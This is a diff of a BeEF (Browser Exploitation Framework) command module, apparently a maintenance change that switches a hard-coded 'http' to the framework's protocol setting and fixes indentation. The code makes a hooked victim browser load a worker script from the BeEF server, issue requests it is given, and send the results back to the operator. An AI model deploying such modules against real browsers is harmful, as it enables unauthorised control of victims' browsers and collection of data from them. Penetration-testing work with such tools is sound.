@@ -12,19 +12,19 @@ beef.execute(function() {
     var post_data = '<%= @post_data %>';
 
     if(!!window.Worker){
-    var myWorker = new Worker('http://' + beef.net.host + ':' + beef.net.port + '/worker.js');
+      var myWorker = new Worker(beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port + '/worker.js');
 
-    myWorker.onmessage = function (oEvent) {
+      myWorker.onmessage = function (oEvent) {
         beef.net.send('<%= @command_url %>', <%= @command_id %>, oEvent.data);
-    };
+      };
 
-        var data = {};
-        data['url'] = url;
-    data['delay'] = delay;
-    data['method'] = method;
-    data['post_data'] = post_data;
+      var data = {};
+      data['url'] = url;
+      data['delay'] = delay;
+      data['method'] = method;
+      data['post_data'] = post_data;
 
-    myWorker.postMessage(data);
+      myWorker.postMessage(data);
     }else{
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'Error: WebWorkers are not supported on this browser.');
     }
